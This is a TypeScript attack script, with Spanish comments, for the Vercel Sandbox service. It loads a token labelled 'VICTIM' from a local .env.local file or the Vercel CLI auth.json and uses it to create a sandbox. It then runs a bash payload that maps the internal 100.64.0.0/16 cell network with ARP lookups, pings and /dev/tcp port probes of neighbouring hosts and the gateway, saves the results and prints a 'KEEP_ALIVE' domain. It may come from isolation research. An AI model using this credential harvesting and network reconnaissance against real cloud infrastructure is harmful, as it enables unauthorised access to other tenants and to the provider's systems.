import { Sandbox } from "@vercel/sandbox";
import { readFileSync, writeFileSync } from "fs";

function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local", "utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json", "utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}

const VICTIM = loadToken();
if (!VICTIM) { console.error("no token"); process.exit(1); }
let V: any;
try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const CMD = `
set +e
echo "===== MI IP en red de celdas ====="
ip -o addr | grep eth0
echo "===== 1. red de celdas 100.64.0.0/16: sondeo MUY acotado ====="
echo "--- ARP vecinos ---"
ip neigh 2>/dev/null
echo "--- ping a vecinos cercanos y lejanos ---"
for ip in 100.64.0.1 100.64.179.1 100.64.179.2 100.64.179.3 100.64.16.7 100.64.64.7 100.64.179.81; do
  timeout 1 ping -W 1 -c 1 $ip >/dev/null 2>&1 && echo "PING $ip ALIVE" || echo "PING $ip no"
done
echo "--- TCP a 3 IPs de muestra (3000/22) con timeout 300ms ---"
for ip in 100.64.179.1 100.64.179.2 100.64.0.1; do
  for p in 22 3000; do
    timeout 1 bash -c "timeout 0.3 bash -c 'echo > /dev/tcp/$ip/$p' 2>/dev/null && echo OPEN $ip:$p" || true
  done
done
echo "--- mi propia celda: escaneo /24 de 100.64.179.0 solo puerto 3000 con timeout 200ms ---"
i=1
for t in 1 2 3 4 5 6 7 8 9 10; do
  timeout 1 bash -c "timeout 0.2 bash -c 'echo > /dev/tcp/100.64.179.\$t/3000' 2>/dev/null && echo OPEN 100.64.179.\$t:3000" || true
done
echo "===== 2. gateway 100.64.0.1 puertos ==="
for p in 22 80 443 3000 8080 23456 26661 30001 30002 5000; do
  timeout 1 bash -c "timeout 0.3 bash -c 'echo > /dev/tcp/100.64.0.1/\$p' 2>/dev/null && echo GW OPEN \$p" || true
done
echo "===== 3. ruta e interface ====="
ip route | head -5
echo "===== DONE ====="
echo "===== 2. el gateway (100.64.0.1) tiene otros puertos? ====="
for p in 22 80 443 3000 8080 23456 26661 30001 30002 5000; do
  timeout 1 bash -c "echo > /dev/tcp/100.64.0.1/\$p" 2>/dev/null && echo "GW OPEN $p" || true
done
echo "===== 3. rastrear mi propia celda: quien mas esta en 100.64.179.x? ====="
ip neigh 2>/dev/null
echo "===== DONE ====="
`;

async function main() {
  const sbx = await Sandbox.create({
    name: "recon-cell-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const res = await sbx.runCommand("bash", ["-c", CMD], { wait: true, timeout: 90_000 });
  const out = await res.output("both");
  writeFileSync("/tmp/cell_recon.txt", out);
  console.log(out);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });